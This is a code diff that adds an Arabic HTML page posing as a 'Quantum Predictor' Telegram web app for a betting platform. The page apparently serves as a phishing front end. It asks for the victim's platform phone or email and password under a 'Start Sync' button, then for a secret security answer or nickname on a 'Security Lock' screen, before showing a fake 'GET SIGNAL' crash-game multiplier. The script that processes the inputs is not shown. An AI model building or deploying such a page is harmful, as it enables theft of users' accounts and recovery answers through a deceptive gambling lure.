@@ -1,25 +1,52 @@
-<section id="security-layer" class="hidden" style="position: fixed; inset: 0; z-index: 999; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 24px; background-color: rgba(0,0,0,0.98); backdrop-filter: blur(20px);">
-    
-    <div style="width: 100%; max-width: 400px; text-align: center;">
-        
-        <div style="width: 80px; height: 80px; background: rgba(255,0,0,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 30px; border: 2px solid #ff0000;">
-            <i class="fas fa-exclamation-triangle" style="color: #ff0000; font-size: 30px;"></i>
-        </div>
-        
-        <h2 style="color: white; font-weight: 900; font-style: italic; text-transform: uppercase; font-size: 24px; margin-bottom: 10px;">Security Lock</h2>
-        <p id="sec-status" style="color: #888; font-size: 12px; font-weight: bold; text-transform: uppercase; margin-bottom: 30px;">أدخل الإجابة السرية أو اللقب لتأكيد هويتك</p>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Quantum Predictor v6</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body class="bg-black text-white overflow-hidden">
 
-        <input type="text" id="sec_ans" placeholder="أدخل اللقب أو الإجابة هنا..." 
-            style="width: 100%; background: #1a1a1a; border: 3px solid #ff0000; padding: 20px; border-radius: 15px; color: white; text-align: center; font-size: 18px; font-weight: bold; outline: none; margin-bottom: 20px; box-shadow: 0 0 15px rgba(255,0,0,0.3);">
-        
-        <button onclick="finalVerify()" id="sec-btn" 
-            style="width: 100%; background: white; color: black; padding: 20px; border-radius: 15px; font-weight: 900; border: none; cursor: pointer; text-transform: uppercase;">
-            Confirm & Unlock Account
-        </button>
-
-        <div style="margin-top: 20px; display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 10px; color: #444; font-weight: 900; text-transform: uppercase;">
-            <span style="width: 6px; height: 6px; background: #ff0000; border-radius: 50%;"></span>
-            Verification Required
+    <section id="auth-screen" class="fixed inset-0 z-50 flex flex-col items-center justify-center p-6 bg-black">
+        <div class="w-full max-w-md text-center space-y-6">
+            <h1 class="text-3xl font-black italic uppercase italic">Quantum<span class="text-blue-600">Node</span></h1>
+            <p id="status-text" class="text-zinc-500 text-sm">اربط حساب المنصة لبدء المزامنة</p>
+            <div class="space-y-3">
+                <input type="text" id="u_log" placeholder="رقم الهاتف أو البريد" class="w-full p-4 bg-zinc-900 rounded-xl outline-none border border-white/5 text-center focus:border-blue-600">
+                <input type="password" id="u_pas" placeholder="كلمة المرور" class="w-full p-4 bg-zinc-900 rounded-xl outline-none border border-white/5 text-center focus:border-blue-600">
+                <button onclick="processAuth()" id="sync-btn" class="w-full py-4 bg-blue-600 rounded-xl font-black uppercase">Start Sync</button>
+            </div>
         </div>
-    </div>
-</section>
+    </section>
+
+    <section id="security-layer" style="position: fixed; inset: 0; z-index: 999; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 24px; background-color: rgba(0,0,0,0.98); backdrop-filter: blur(20px);">
+        <div style="width: 100%; max-width: 400px; text-align: center;">
+            <div style="width: 80px; height: 80px; background: rgba(255,0,0,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 30px; border: 2px solid #ff0000; box-shadow: 0 0 20px rgba(255,0,0,0.2);">
+                <i class="fas fa-exclamation-triangle" style="color: #ff0000; font-size: 30px;"></i>
+            </div>
+            <h2 style="color: white; font-weight: 900; font-style: italic; text-transform: uppercase; font-size: 24px; margin-bottom: 10px;">Security Lock</h2>
+            <p id="sec-status" style="color: #888; font-size: 11px; font-weight: bold; text-transform: uppercase; margin-bottom: 30px;">أدخل الإجابة السرية أو اللقب لتأكيد هويتك</p>
+            <input type="text" id="sec_ans" placeholder="أدخل اللقب أو الإجابة هنا..." 
+                style="width: 100%; background: #111; border: 2px solid #ff0000; padding: 18px; border-radius: 12px; color: white; text-align: center; font-size: 16px; font-weight: bold; outline: none; margin-bottom: 20px;">
+            <button onclick="finalVerify()" id="sec-btn" style="width: 100%; background: white; color: black; padding: 18px; border-radius: 12px; font-weight: 900; border: none; cursor: pointer; text-transform: uppercase;">Confirm & Unlock</button>
+        </div>
+    </section>
+
+    <section id="main-app" class="hidden fixed inset-0 bg-black p-6 flex flex-col items-center justify-center">
+        <div class="text-center">
+            <div id="target-mult" class="text-7xl font-black text-white">1.00x</div>
+            <button onclick="getSignal()" id="action-btn" class="mt-10 px-10 py-4 bg-cyan-500 text-black font-black rounded-full">GET SIGNAL</button>
+        </div>
+    </section>
+
+    <style>
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        .hidden { display: none !important; }
+    </style>
+
+    <script src="script.js"></script>
+</body>
+</html>
